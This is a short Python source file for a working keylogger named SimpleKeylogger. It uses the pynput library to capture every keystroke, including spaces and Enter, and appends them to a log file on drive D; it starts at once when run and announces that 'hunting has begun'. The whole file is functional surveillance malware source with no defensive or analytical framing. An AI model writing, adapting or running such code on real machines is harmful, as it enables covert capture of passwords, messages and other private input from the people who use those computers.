import pynput.keyboard

class SimpleKeylogger:
    def __init__(self):
        self.log = ""
        self.append_to_log("Hunting has begun...\n")

    def append_to_log(self, key_strike):
        with open("D:/log.txt", "a") as log_file:
            log_file.write(key_strike)

    def evaluate_keys(self, key):
        try:
            # Attempt to get the character representation of the key
            pressed_key = key.char
            if pressed_key:  # Valid character
                # Add to log, respecting capitalization
                self.log += pressed_key
        except AttributeError:
            # Handle special keys
            if key == key.space:  # Log a space
                self.log += " "
            elif key == key.enter:  # Log a newline for Enter key
                self.log += "\n"
            else:
                # Ignore other special keys like Shift, Caps Lock, etc.
                return

        # Write to log file and clear buffer
        if self.log:
            self.append_to_log(self.log)
            self.log = ""  # Clear the log buffer after writing

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()

SimpleKeylogger().start()
